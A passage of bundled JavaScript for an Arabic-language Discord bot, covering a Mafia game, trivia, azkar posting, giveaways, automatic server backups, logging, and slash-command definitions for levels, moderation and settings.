  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u062C\u0648\u0639 \u0641\u0625\u0646\u0647 \u0628\u0626\u0633 \u0627\u0644\u0636\u062C\u064A\u0639 \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u062E\u064A\u0627\u0646\u0629 \u0641\u0625\u0646\u0647\u0627 \u0628\u0626\u0633\u062A \u0627\u0644\u0628\u0637\u0627\u0646\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0634\u0642\u0627\u0642 \u0648\u0627\u0644\u0646\u0641\u0627\u0642 \u0648\u0633\u0648\u0621 \u0627\u0644\u0623\u062E\u0644\u0627\u0642",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0635\u0645\u0645 \u0648\u0627\u0644\u0628\u0643\u0645 \u0648\u0627\u0644\u062C\u0646\u0648\u0646 \u0648\u0627\u0644\u062C\u0630\u0627\u0645 \u0648\u0627\u0644\u0628\u0631\u0635 \u0648\u0633\u064A\u0626 \u0627\u0644\u0623\u0633\u0642\u0627\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0642\u0633\u0648\u0629 \u0648\u0627\u0644\u063A\u0641\u0644\u0629 \u0648\u0627\u0644\u0639\u064A\u0644\u0629 \u0648\u0627\u0644\u0630\u0644\u0629 \u0648\u0627\u0644\u0645\u0633\u0643\u0646\u0629 \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0641\u0642\u0631 \u0648\u0627\u0644\u0643\u0641\u0631 \u0648\u0627\u0644\u0641\u0633\u0648\u0642 \u0648\u0627\u0644\u0634\u0642\u0627\u0642 \u0648\u0627\u0644\u0646\u0641\u0627\u0642 \u0648\u0627\u0644\u0633\u0645\u0639\u0629 \u0648\u0627\u0644\u0631\u064A\u0627\u0621 \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0635\u0645\u0645 \u0648\u0627\u0644\u0628\u0643\u0645 \u0648\u0627\u0644\u062C\u0646\u0648\u0646 \u0648\u0627\u0644\u062C\u0630\u0627\u0645 \u0648\u0627\u0644\u0628\u0631\u0635 \u0648\u0633\u064A\u0626 \u0627\u0644\u0623\u0633\u0642\u0627\u0645"
];
const evaluationStates = /* @__PURE__ */ new Map();
const triviaQuestions = [
  { q: "\u0645\u0627 \u0647\u064A \u0639\u0627\u0635\u0645\u0629 \u0641\u0631\u0646\u0633\u0627\u061F", a: "\u0628\u0627\u0631\u064A\u0633" },
  { q: "\u0645\u0627 \u0647\u0648 \u0623\u0637\u0648\u0644 \u0646\u0647\u0631 \u0641\u064A \u0627\u0644\u0639\u0627\u0644\u0645\u061F", a: "\u0627\u0644\u0646\u064A\u0644" },
  { q: "\u0645\u0646 \u0647\u0648 \u0645\u0643\u062A\u0634\u0641 \u0627\u0644\u062C\u0627\u0630\u0628\u064A\u0629\u061F", a: "\u0646\u064A\u0648\u062A\u0646" },
  { q: "\u0645\u0627 \u0647\u0648 \u0623\u0643\u0628\u0631 \u0643\u0648\u0643\u0628 \u0641\u064A \u0627\u0644\u0645\u062C\u0645\u0648\u0639\u0629 \u0627\u0644\u0634\u0645\u0633\u064A\u0629\u061F", a: "\u0627\u0644\u0645\u0634\u062A\u0631\u064A" },
  { q: "\u0645\u0627 \u0647\u0648 \u0644\u0648\u0646 \u0627\u0644\u0632\u0645\u0631\u062F\u061F", a: "\u0623\u062E\u0636\u0631" },
  { q: "\u0643\u0645 \u0639\u062F\u062F \u0642\u0627\u0631\u0627\u062A \u0627\u0644\u0639\u0627\u0644\u0645\u061F", a: "7" },
  { q: "\u0645\u0627 \u0647\u0648 \u0623\u0633\u0631\u0639 \u062D\u064A\u0648\u0627\u0646 \u0628\u0631\u064A\u061F", a: "\u0627\u0644\u0641\u0647\u062F" },
  { q: "\u0641\u064A \u0623\u064A \u0642\u0627\u0631\u0629 \u062A\u0642\u0639 \u0645\u0635\u0631\u061F", a: "\u0623\u0641\u0631\u064A\u0642\u064A\u0627" }
];
const hangmanWords = ["\u062A\u0641\u0627\u062D\u0629", "\u0628\u0631\u062A\u0642\u0627\u0644", "\u0643\u0645\u0628\u064A\u0648\u062A\u0631", "\u0633\u064A\u0627\u0631\u0629", "\u0637\u0627\u0626\u0631\u0629", "\u0645\u062F\u0631\u0633\u0629", "\u0643\u062A\u0627\u0628", "\u0642\u0644\u0645", "\u0634\u0645\u0633", "\u0642\u0645\u0631"];
async function startNightPhase(game) {
  game.phase = "night";
  game.nightActions = {};
  const channel = client.channels.cache.get(game.channelId);
  if (!channel) return;
  const alivePlayers = game.players.filter((p) => p.isAlive);
  const mafia = alivePlayers.find((p) => p.role === "mafia");
  const doctor = alivePlayers.find((p) => p.role === "doctor");
  const detective = alivePlayers.find((p) => p.role === "detective");
  const embed = new EmbedBuilder().setTitle("\u{1F319} \u0627\u0644\u0644\u064A\u0644 \u062D\u0644").setDescription("\u0627\u0644\u0645\u0627\u0641\u064A\u0627\u060C \u0627\u0644\u0637\u0628\u064A\u0628\u060C \u0648\u0627\u0644\u0645\u062D\u0642\u0642\u060C \u0627\u0636\u063A\u0637\u0648\u0627 \u0639\u0644\u0649 \u0627\u0644\u0623\u0632\u0631\u0627\u0631 \u0623\u062F\u0646\u0627\u0647 \u0644\u0644\u0642\u064A\u0627\u0645 \u0628\u0645\u0647\u0627\u0645\u0643\u0645.").setColor(0).setTimestamp();
  const actionRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("mafia_action_mafia").setLabel("\u0645\u0647\u0645\u0629 \u0627\u0644\u0645\u0627\u0641\u064A\u0627").setStyle(ButtonStyle.Danger),
    new ButtonBuilder().setCustomId("mafia_action_doctor").setLabel("\u0645\u0647\u0645\u0629 \u0627\u0644\u0637\u0628\u064A\u0628").setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId("mafia_action_detective").setLabel("\u0645\u0647\u0645\u0629 \u0627\u0644\u0645\u062D\u0642\u0642").setStyle(ButtonStyle.Primary)
  );
  await channel.send({ embeds: [embed], components: [actionRow] });
  game.timer = setTimeout(() => startDayPhase(game), 45e3);
}
async function startDayPhase(game) {
  if (game.timer) clearTimeout(game.timer);
  game.phase = "day";
  const channel = client.channels.cache.get(game.channelId);
  if (!channel) return;
  let killedId = game.nightActions.mafiaTarget;
  if (killedId === game.nightActions.doctorTarget) {
    killedId = void 0;
  }
  let deathMsg = "\u0644\u0645 \u064A\u0645\u062A \u0623\u062D\u062F \u0627\u0644\u0644\u064A\u0644\u0629!";
  if (killedId) {
    const victim = game.players.find((p) => p.id === killedId);
    if (victim) {
      victim.isAlive = false;
      deathMsg = `\u0644\u0642\u062F \u0642\u064F\u062A\u0644 **${victim.tag}** \u0627\u0644\u0644\u064A\u0644\u0629!`;
    }
  }
  const aiNarration = await getAINarration(`In a Mafia game, the night has ended. ${deathMsg}`);
  const embed = new EmbedBuilder().setTitle("\u{1F319} \u0627\u0644\u0635\u0628\u0627\u062D \u062D\u0644").setDescription(`${aiNarration}

${deathMsg}

\u0646\u0627\u0642\u0634\u0648\u0627 \u0627\u0644\u0622\u0646 \u0645\u0646 \u062A\u0639\u062A\u0642\u062F\u0648\u0646 \u0623\u0646\u0647 \u0627\u0644\u0645\u0627\u0641\u064A\u0627. \u0633\u064A\u0628\u062F\u0623 \u0627\u0644\u062A\u0635\u0648\u064A\u062A \u0628\u0639\u062F 60 \u062B\u0627\u0646\u064A\u0629.`).setColor(16776960).setTimestamp();
  await channel.send({ embeds: [embed] });
  if (checkWinCondition(game)) return;
  game.timer = setTimeout(() => startVotingPhase(game), 6e4);
}
async function startVotingPhase(game) {
  if (game.timer) clearTimeout(game.timer);
  game.phase = "voting";
  game.votes = /* @__PURE__ */ new Map();
  const channel = client.channels.cache.get(game.channelId);
  if (!channel) return;
  const alivePlayers = game.players.filter((p) => p.isAlive);
  const options = alivePlayers.map((p) => new StringSelectMenuOptionBuilder().setLabel(p.tag).setValue(p.id));
  const select = new StringSelectMenuBuilder().setCustomId("mafia_vote").setPlaceholder("\u0635\u0648\u062A \u0636\u062F \u0634\u062E\u0635 \u0645\u0627").addOptions(options);
  const row = new ActionRowBuilder().addComponents(select);
  const embed = new EmbedBuilder().setTitle("\u{1F5F3}\uFE0F \u0648\u0642\u062A \u0627\u0644\u062A\u0635\u0648\u064A\u062A").setDescription("\u0635\u0648\u062A\u0648\u0627 \u0636\u062F \u0627\u0644\u0634\u062E\u0635 \u0627\u0644\u0630\u064A \u062A\u0639\u062A\u0642\u062F\u0648\u0646 \u0623\u0646\u0647 \u0627\u0644\u0645\u0627\u0641\u064A\u0627. \u0644\u062F\u064A\u0643\u0645 30 \u062B\u0627\u0646\u064A\u0629.").setColor(16711680).setTimestamp();
  await channel.send({ embeds: [embed], components: [row] });
  game.timer = setTimeout(() => endVotingPhase(game), 3e4);
}
async function endVotingPhase(game) {
  if (game.timer) clearTimeout(game.timer);
  const channel = client.channels.cache.get(game.channelId);
  if (!channel) return;
  const voteCounts = /* @__PURE__ */ new Map();
  for (const targetId of game.votes.values()) {
    voteCounts.set(targetId, (voteCounts.get(targetId) || 0) + 1);
  }
  let maxVotes = 0;
  let votedOutId;
  let tie = false;
  for (const [id, count] of voteCounts.entries()) {
    if (count > maxVotes) {
      maxVotes = count;
      votedOutId = id;
      tie = false;
    } else if (count === maxVotes) {
      tie = true;
    }
  }
  if (tie || !votedOutId) {
    const aiNarration = await getAINarration("The town could not agree on who to execute. No one was killed.");
    await channel.send(`\u2696\uFE0F **\u0627\u0644\u0646\u062A\u064A\u062C\u0629:** ${aiNarration}
\u0644\u0645 \u064A\u062A\u0645 \u0627\u0644\u0627\u062A\u0641\u0627\u0642 \u0639\u0644\u0649 \u0623\u062D\u062F\u060C \u0644\u0627 \u0623\u062D\u062F \u0633\u064A\u064F\u0637\u0631\u062F \u0627\u0644\u064A\u0648\u0645.`);
  } else {
    const victim = game.players.find((p) => p.id === votedOutId);
    if (victim) {
      victim.isAlive = false;
      const aiNarration = await getAINarration(`The town has voted to execute ${victim.tag}. They were a ${victim.role === "mafia" ? "Mafia" : "Citizen"}.`);
      await channel.send(`\u2696\uFE0F **\u0627\u0644\u0646\u062A\u064A\u062C\u0629:** ${aiNarration}
\u062A\u0645 \u0637\u0631\u062F **${victim.tag}**! \u0644\u0642\u062F \u0643\u0627\u0646 **${victim.role === "mafia" ? "\u0645\u0627\u0641\u064A\u0627" : "\u0628\u0631\u064A\u0621"}**.`);
    }
  }
  if (checkWinCondition(game)) return;
  startNightPhase(game);
}
function checkWinCondition(game) {
  const alivePlayers = game.players.filter((p) => p.isAlive);
  const mafiaAlive = alivePlayers.some((p) => p.role === "mafia");
  const citizensAlive = alivePlayers.filter((p) => p.role !== "mafia").length;
  const channel = client.channels.cache.get(game.channelId);
  if (!mafiaAlive) {
    const winners = alivePlayers.filter((p) => p.role !== "mafia").map((p) => `<@${p.id}>`).join(", ");
    channel?.send(`\u{1F389} \u0645\u0628\u0631\u0648\u0643! \u0644\u0642\u062F \u0641\u0627\u0632 \u0627\u0644\u0645\u0648\u0627\u0637\u0646\u0648\u0646 \u0648\u062A\u0645 \u0627\u0644\u0642\u0636\u0627\u0621 \u0639\u0644\u0649 \u0627\u0644\u0645\u0627\u0641\u064A\u0627!
\u0627\u0644\u0641\u0627\u0626\u0632\u0648\u0646: ${winners}`);
    mafiaGames.delete(game.guildId);
    return true;
  }
  if (citizensAlive <= 1) {
    const winners = alivePlayers.filter((p) => p.role === "mafia").map((p) => `<@${p.id}>`).join(", ");
    channel?.send(`\u{1F480} \u0644\u0642\u062F \u0641\u0627\u0632\u062A \u0627\u0644\u0645\u0627\u0641\u064A\u0627! \u0644\u0642\u062F \u0642\u0636\u0648\u0627 \u0639\u0644\u0649 \u0627\u0644\u062C\u0645\u064A\u0639.
\u0627\u0644\u0641\u0627\u0626\u0632\u0648\u0646: ${winners}`);
    mafiaGames.delete(game.guildId);
    return true;
  }
  return false;
}
const logFile = "bot.log";
const AUTHORIZED_CURRENCY_IDS = ["1319641803409985661", "1365356622922256525", "1071164421222695042"];
const logs = [];
const aiModel = "gemini-3-flash-preview";
const ai = new GoogleGenAI({ apiKey: GEMINI_API_KEY });
async function handleAIResponse(message, prompt) {
  try {
    const response = await ai.models.generateContent({
      model: aiModel,
      contents: prompt,
      config: {
        systemInstruction: "You are a helpful and friendly Discord bot. Keep your answers concise and engaging. Respond in the same language as the user."
      }
    });
    if (response.text) {
      await message.reply(response.text);
    }
  } catch (error) {
    console.error("AI Error:", error);
    await message.reply("\u274C \u0639\u0630\u0631\u0627\u064B\u060C \u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u0645\u0639\u0627\u0644\u062C\u0629 \u0637\u0644\u0628\u0643.");
  }
}
const localTriviaQuestions = [
  { q: "\u0645\u0627 \u0647\u064A \u0639\u0627\u0635\u0645\u0629 \u0641\u0631\u0646\u0633\u0627\u061F", a: "\u0628\u0627\u0631\u064A\u0633" },
  { q: "\u0645\u0627 \u0647\u0648 \u0623\u0643\u0628\u0631 \u0643\u0648\u0643\u0628 \u0641\u064A \u0627\u0644\u0645\u062C\u0645\u0648\u0639\u0629 \u0627\u0644\u0634\u0645\u0633\u064A\u0629\u061F", a: "\u0627\u0644\u0645\u0634\u062A\u0631\u064A" },
  { q: "\u0645\u0646 \u0647\u0648 \u0645\u0643\u062A\u0634\u0641 \u0627\u0644\u062C\u0627\u0630\u0628\u064A\u0629\u061F", a: "\u0646\u064A\u0648\u062A\u0646" },
  { q: "\u0645\u0627 \u0647\u0648 \u0623\u0633\u0631\u0639 \u062D\u064A\u0648\u0627\u0646 \u0628\u0631\u064A\u061F", a: "\u0627\u0644\u0641\u0647\u062F" },
  { q: "\u0643\u0645 \u0639\u062F\u062F \u0642\u0627\u0631\u0627\u062A \u0627\u0644\u0639\u0627\u0644\u0645\u061F", a: "7" },
  { q: "\u0645\u0627 \u0647\u0648 \u0623\u0637\u0648\u0644 \u0646\u0647\u0631 \u0641\u064A \u0627\u0644\u0639\u0627\u0644\u0645\u061F", a: "\u0627\u0644\u0646\u064A\u0644" },
  { q: "\u0645\u0627 \u0647\u064A \u0639\u0627\u0635\u0645\u0629 \u0627\u0644\u064A\u0627\u0628\u0627\u0646\u061F", a: "\u0637\u0648\u0643\u064A\u0648" },
  { q: "\u0645\u0627 \u0647\u0648 \u0627\u0644\u0645\u0639\u062F\u0646 \u0627\u0644\u0633\u0627\u0626\u0644 \u0641\u064A \u062F\u0631\u062C\u0629 \u062D\u0631\u0627\u0631\u0629 \u0627\u0644\u063A\u0631\u0641\u0629\u061F", a: "\u0627\u0644\u0632\u0626\u0628\u0642" },
  { q: "\u0643\u0645 \u0639\u062F\u062F \u0623\u0633\u0646\u0627\u0646 \u0627\u0644\u0625\u0646\u0633\u0627\u0646 \u0627\u0644\u0628\u0627\u0644\u063A\u061F", a: "32" },
  { q: "\u0645\u0627 \u0647\u0648 \u0623\u0635\u0644\u0628 \u0645\u0627\u062F\u0629 \u0641\u064A \u0627\u0644\u0637\u0628\u064A\u0639\u0629\u061F", a: "\u0627\u0644\u0623\u0644\u0645\u0627\u0633" }
];
async function getAITrivia() {
  return localTriviaQuestions[Math.floor(Math.random() * localTriviaQuestions.length)];
}
const localHangmanWords = [
  { word: "\u0628\u0631\u0645\u062C\u0629", hint: "\u0643\u062A\u0627\u0628\u0629 \u0627\u0644\u0623\u0643\u0648\u0627\u062F" },
  { word: "\u062D\u0627\u0633\u0648\u0628", hint: "\u062C\u0647\u0627\u0632 \u0625\u0644\u0643\u062A\u0631\u0648\u0646\u064A" },
  { word: "\u0625\u0646\u062A\u0631\u0646\u062A", hint: "\u0634\u0628\u0643\u0629 \u0639\u0627\u0644\u0645\u064A\u0629" },
  { word: "\u0645\u0645\u0644\u0643\u0629", hint: "\u0646\u0638\u0627\u0645 \u062D\u0643\u0645" },
  { word: "\u0633\u064A\u0627\u0631\u0629", hint: "\u0648\u0633\u064A\u0644\u0629 \u0646\u0642\u0644" },
  { word: "\u0645\u062F\u0631\u0633\u0629", hint: "\u0645\u0643\u0627\u0646 \u0644\u0644\u062A\u0639\u0644\u064A\u0645" },
  { word: "\u0645\u0633\u062A\u0634\u0641\u0649", hint: "\u0645\u0643\u0627\u0646 \u0644\u0644\u0639\u0644\u0627\u062C" },
  { word: "\u0637\u0627\u0626\u0631\u0629", hint: "\u0648\u0633\u064A\u0644\u0629 \u0646\u0642\u0644 \u062C\u0648\u064A\u0629" },
  { word: "\u063A\u0627\u0628\u0629", hint: "\u0645\u0643\u0627\u0646 \u0645\u0644\u064A\u0621 \u0628\u0627\u0644\u0623\u0634\u062C\u0627\u0631" },
  { word: "\u0635\u062D\u0631\u0627\u0621", hint: "\u0645\u0643\u0627\u0646 \u062C\u0627\u0641 \u0648\u0631\u0645\u0627\u0644" }
];
async function getAIHangmanWord() {
  return localHangmanWords[Math.floor(Math.random() * localHangmanWords.length)];
}
const localNicknames = ["\u0627\u0644\u0623\u0633\u0637\u0648\u0631\u0629", "\u0627\u0644\u0642\u0646\u0627\u0635", "\u0627\u0644\u0645\u062D\u062A\u0631\u0641", "\u0627\u0644\u0646\u064A\u0646\u062C\u0627", "\u0627\u0644\u0648\u062D\u0634", "\u0627\u0644\u0628\u0631\u0642", "\u0627\u0644\u0631\u0639\u062F", "\u0627\u0644\u0635\u0642\u0631", "\u0627\u0644\u0623\u0633\u062F", "\u0627\u0644\u0641\u0647\u062F"];
async function getAINicknames(count) {
  return localNicknames.sort(() => 0.5 - Math.random()).slice(0, count);
}
async function getAIComment(context) {
  return "\u0644\u0639\u0628\u0629 \u0631\u0627\u0626\u0639\u0629!";
}
async function getAINarration(context) {
  return "\u062D\u062F\u062B \u0634\u064A\u0621 \u0645\u062B\u064A\u0631 \u0641\u064A \u0627\u0644\u0644\u0639\u0628\u0629!";
}
function isCommandAllowed(guildId, commandName, channelId) {
  const denyRecord = db.prepare("SELECT 1 FROM command_permissions WHERE guildId = ? AND commandName = ? AND channelId = ? AND type = 'deny'").get(guildId, commandName, channelId);
  if (denyRecord) return false;
  const allowRecordsCount = db.prepare("SELECT COUNT(*) as count FROM command_permissions WHERE guildId = ? AND commandName = ? AND type = 'allow'").get(guildId, commandName);
  if (allowRecordsCount.count === 0) {
    return true;
  }
  const allowRecord = db.prepare("SELECT 1 FROM command_permissions WHERE guildId = ? AND commandName = ? AND channelId = ? AND type = 'allow'").get(guildId, commandName, channelId);
  return !!allowRecord;
}
const originalLog = console.log;
const originalError = console.error;
const originalWarn = console.warn;
const writeToFile = (msg) => {
  fs.appendFileSync(logFile, msg + "\n");
};
console.log = (...args) => {
  const msg = `[LOG] ${args.join(" ")}`;
  logs.push(msg);
  if (logs.length > 100) logs.shift();
  writeToFile(msg);
  originalLog(...args);
};
console.error = (...args) => {
  const msg = `[ERROR] ${args.join(" ")}`;
  logs.push(msg);
  if (logs.length > 100) logs.shift();
  writeToFile(msg);
  originalError(...args);
};
console.warn = (...args) => {
  const msg = `[WARN] ${args.join(" ")}`;
  logs.push(msg);
  if (logs.length > 100) logs.shift();
  writeToFile(msg);
  originalWarn(...args);
};
const safeReply = async (message, content) => {
  if (!message.guild) return;
  const channel = message.channel;
  if (!channel.permissionsFor) return;
  const botPermissions = channel.permissionsFor(message.guild.members.me);
  if (!botPermissions?.has(PermissionFlagsBits.SendMessages)) return;
  try {
    if (botPermissions.has(PermissionFlagsBits.ReadMessageHistory)) {
      return await message.reply(content);
    } else {
      return await message.channel.send(content);
    }
  } catch (err) {
    console.error("SafeReply failed:", err);
  }
};
setInterval(async () => {
  console.log("Running automatic backups...");
  for (const guild of client.guilds.cache.values()) {
    try {
      const roles = guild.roles.cache.map((r) => ({
        name: r.name,
        color: r.color,
        hoist: r.hoist,
        permissions: r.permissions.bitfield.toString(),
        mentionable: r.mentionable,
        position: r.position
      }));
      const channels = guild.channels.cache.map((c) => ({
        name: c.name,
        type: c.type,
        topic: c.topic || null,
        nsfw: c.nsfw || false,
        parentId: c.parentId || null,
        position: c.rawPosition,
        permissionOverwrites: c.permissionOverwrites?.cache.map((o) => ({
          id: o.id,
          type: o.type,
          allow: o.allow.bitfield.toString(),
          deny: o.deny.bitfield.toString()
        }))
      }));
      const backupData = JSON.stringify({ roles, channels });
      const name = `Automatic Backup - ${(/* @__PURE__ */ new Date()).toLocaleDateString("ar-EG")}`;
      db.prepare("INSERT INTO backups (guildId, name, data) VALUES (?, ?, ?)").run(guild.id, name, backupData);
      const oldBackups = db.prepare("SELECT id FROM backups WHERE guildId = ? AND name LIKE 'Automatic Backup%' ORDER BY createdAt DESC").all(guild.id);
      if (oldBackups.length > 5) {
        const idsToDelete = oldBackups.slice(5).map((b) => b.id);
        db.prepare(`DELETE FROM backups WHERE id IN (${idsToDelete.join(",")})`).run();
      }
      console.log(`Automatic backup created for guild: ${guild.name}`);
    } catch (err) {
      console.error(`Failed to create automatic backup for guild ${guild.id}:`, err);
    }
  }
}, 864e5);
client.on("ready", async () => {
  console.log(`Logged in as ${client.user?.tag}!`);
  try {
    const avatarUrl = "https://picsum.photos/seed/shield-bot/512/512";
    await client.user?.setAvatar(avatarUrl);
    console.log("\u2705 Bot avatar updated successfully!");
  } catch (err) {
    console.error("\u274C Failed to update avatar on startup:", err);
  }
  console.log(`Bot is in ${client.guilds.cache.size} guilds: ${client.guilds.cache.map((g) => `${g.name} (${g.id})`).join(", ")}`);
  await syncCurrencyFromLogs();
  client.on(Events.MessageDelete, async (message) => {
    for (const [guildId, game] of mafiaGames.entries()) {
      if (game.messageId === message.id) {
        if (game.timer) clearTimeout(game.timer);
        mafiaGames.delete(guildId);
        const channel = client.channels.cache.get(game.channelId);
        if (channel) {
          await channel.send(`\u26A0\uFE0F \u062A\u0645 \u0625\u064A\u0642\u0627\u0641 \u0644\u0639\u0628\u0629 \u0627\u0644\u0645\u0627\u0641\u064A\u0627 \u0644\u0623\u0646 \u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u0644\u0639\u0628\u0629 \u062D\u064F\u0630\u0641\u062A.`);
        }
        break;
      }
    }
    if (activeGames.has(message.id)) {
      const game = activeGames.get(message.id);
      if (game.timer) clearTimeout(game.timer);
      if (game.collector) game.collector.stop("message_deleted");
      activeGames.delete(message.id);
      const channel = client.channels.cache.get(game.channelId);
      if (channel) {
        await channel.send(`\u26A0\uFE0F \u062A\u0645 \u0625\u064A\u0642\u0627\u0641 \u0644\u0639\u0628\u0629 **${game.type}** \u0644\u0623\u0646 \u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u0644\u0639\u0628\u0629 \u062D\u064F\u0630\u0641\u062A.`);
      }
    }
  });
  setInterval(async () => {
    const activeGiveaways = db.prepare("SELECT * FROM giveaways WHERE status = 'active' AND endTime <= ?").all(Date.now());
    for (const giveaway of activeGiveaways) {
      const participants = db.prepare("SELECT userId FROM giveaway_participants WHERE messageId = ?").all(giveaway.messageId);
      let winners = [];
      let rouletteBuffer = null;
      if (participants.length > 0) {
        const shuffled = participants.sort(() => 0.5 - Math.random());
        winners = shuffled.slice(0, giveaway.winnersCount).map((p) => p.userId);
        const participantUsernames = await Promise.all(participants.slice(0, 8).map(async (p) => {
          const user = await client.users.fetch(p.userId).catch(() => ({ username: "Unknown" }));
          return user.username;
        }));
        const winnerUser = await client.users.fetch(winners[0]).catch(() => ({ username: "Unknown" }));
        const winnerIdx = participantUsernames.indexOf(winnerUser.username);
        if (winnerIdx !== -1) {
          rouletteBuffer = await generateRouletteImage(participantUsernames, winnerIdx);
        }
      }
      const channel = await client.channels.fetch(giveaway.channelId).catch(() => null);
      if (channel) {
        const msg = await channel.messages.fetch(giveaway.messageId).catch(() => null);
        if (msg) {
          const winnerMentions = winners.length > 0 ? winners.map((id) => `<@${id}>`).join(", ") : "\u0644\u0627 \u064A\u0648\u062C\u062F \u0645\u0634\u0627\u0631\u0643\u0648\u0646";
          const embed = new EmbedBuilder().setTitle("\u{1F389} \u0627\u0646\u062A\u0647\u062A \u0627\u0644\u0645\u0633\u0627\u0628\u0642\u0629!").setDescription(`\u0627\u0644\u062C\u0627\u0626\u0632\u0629: **${giveaway.prize}**
\u0627\u0644\u0641\u0627\u0626\u0632\u0648\u0646: ${winnerMentions}`).setColor(16711680);
          const files = rouletteBuffer ? [new AttachmentBuilder(rouletteBuffer, { name: "roulette.gif" })] : [];
          await msg.edit({ embeds: [embed], components: [] });
          await channel.send({ content: `\u{1F389} \u0645\u0628\u0631\u0648\u0643 \u0644\u0644\u0641\u0627\u0626\u0632\u064A\u0646: ${winnerMentions} \u0628\u0627\u0644\u062C\u0627\u0626\u0632\u0629: **${giveaway.prize}**`, files });
        }
      }
      db.prepare("UPDATE giveaways SET status = 'ended' WHERE messageId = ?").run(giveaway.messageId);
    }
  }, 6e4);
  setInterval(async () => {
    const settings = db.prepare("SELECT * FROM azkar_settings WHERE enabled = 1").all();
    for (const setting of settings) {
      const now = Date.now();
      const lastSent = lastAzkarSent.get(setting.guildId) || 0;
      const intervalMs = setting.interval * 60 * 1e3;
      if (now - lastSent >= intervalMs) {
        const channel = client.channels.cache.get(setting.channelId);
        if (channel) {
          const customAzkar = db.prepare("SELECT content FROM custom_azkar WHERE guildId = ?").all(setting.guildId);
          const combinedList = [...AZKAR_LIST, ...customAzkar.map((a) => a.content)];
          const randomZikr = combinedList[Math.floor(Math.random() * combinedList.length)];
          const embed = new EmbedBuilder().setTitle("\u{1F4FF} \u0630\u0643\u0631").setDescription(randomZikr).setColor(65280).setTimestamp();
          await channel.send({ embeds: [embed] }).catch(() => {
          });
          lastAzkarSent.set(setting.guildId, now);
        }
      }
    }
  }, 6e4);
  const commands = [
    new SlashCommandBuilder().setName("ping").setDescription("Check bot latency"),
    new SlashCommandBuilder().setName("rank").setDescription("Check your current level and XP"),
    new SlashCommandBuilder().setName("top").setDescription("View the leaderboard").addStringOption((option) => option.setName("timeframe").setDescription("The timeframe for the leaderboard").addChoices(
      { name: "Daily", value: "day" },
      { name: "Weekly", value: "week" },
      { name: "Monthly", value: "month" },
      { name: "Yearly", value: "year" },
      { name: "All-Time", value: "all" }
    )).addStringOption((option) => option.setName("type").setDescription("The type of XP (Text or Voice)").addChoices(
      { name: "Text", value: "text" },
      { name: "Voice", value: "voice" }
    )).addRoleOption((option) => option.setName("role").setDescription("Filter by role")).addIntegerOption((option) => option.setName("limit").setDescription("Number of users to show (1-25)")),
    new SlashCommandBuilder().setName("id").setDescription("View your or another user's profile card").addUserOption((option) => option.setName("user").setDescription("The user to view")),
    new SlashCommandBuilder().setName("bonus").setDescription("Check current XP bonus status"),
    new SlashCommandBuilder().setName("rewards").setDescription("View level role rewards"),
    new SlashCommandBuilder().setName("nick").setDescription("Change your or another user's nickname").addStringOption((option) => option.setName("name").setDescription("The new nickname (leave empty to reset)")).addUserOption((option) => option.setName("user").setDescription("The user to change (requires Manage Nicknames)")),
    new SlashCommandBuilder().setName("clear").setDescription("Purge a number of messages").addIntegerOption((option) => option.setName("amount").setDescription("Number of messages to delete (1-100)").setRequired(true)),
    new SlashCommandBuilder().setName("reset-server").setDescription("Reset the server (Owner Only)"),
    new SlashCommandBuilder().setName("setup-ticket").setDescription("Create the ticket support interface").addRoleOption((option) => option.setName("role").setDescription("The support role to mention").setRequired(true)),
    new SlashCommandBuilder().setName("setxp").setDescription("Set a user's XP (Admin Only)").addUserOption((option) => option.setName("user").setDescription("The user").setRequired(true)).addIntegerOption((option) => option.setName("amount").setDescription("The XP amount").setRequired(true)),
    new SlashCommandBuilder().setName("set-reward").setDescription("Set a level role reward (Admin Only)").addIntegerOption((option) => option.setName("level").setDescription("The level").setRequired(true)).addRoleOption((option) => option.setName("role").setDescription("The role").setRequired(true)),
    new SlashCommandBuilder().setName("set-prefix").setDescription("Change the bot prefix (Admin Only)").addStringOption((option) => option.setName("prefix").setDescription("The new prefix").setRequired(true)),
    new SlashCommandBuilder().setName("set-level").setDescription("\u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0646\u0638\u0627\u0645 \u0627\u0644\u0644\u0641\u0644 (Admin Only)").addChannelOption((option) => option.setName("channel").setDescription("\u0642\u0646\u0627\u0629 \u0627\u0644\u062A\u0646\u0628\u064A\u0647\u0627\u062A")).addStringOption((option) => option.setName("message").setDescription("\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u0631\u0642\u064A\u0629 ({user}, {level}, {xp} \u0647\u064A \u0631\u0645\u0648\u0632 \u0628\u062F\u064A\u0644\u0629)")).addStringOption((option) => option.setName("status").setDescription("\u062A\u0641\u0639\u064A\u0644 \u0623\u0648 \u062A\u0639\u0637\u064A\u0644 \u0627\u0644\u0646\u0638\u0627\u0645").addChoices(
      { name: "\u062A\u0641\u0639\u064A\u0644", value: "on" },
      { name: "\u062A\u0639\u0637\u064A\u0644", value: "off" }
    )),
    new SlashCommandBuilder().setName("disable").setDescription("\u062A\u0639\u0637\u064A\u0644 \u0645\u064A\u0632\u0627\u062A \u0627\u0644\u0628\u0648\u062A (Admin Only)").addStringOption((option) => option.setName("feature").setDescription("\u0627\u0644\u0645\u064A\u0632\u0629 \u0627\u0644\u0645\u0631\u0627\u062F \u062A\u0639\u0637\u064A\u0644\u0647\u0627").setRequired(true).addChoices(
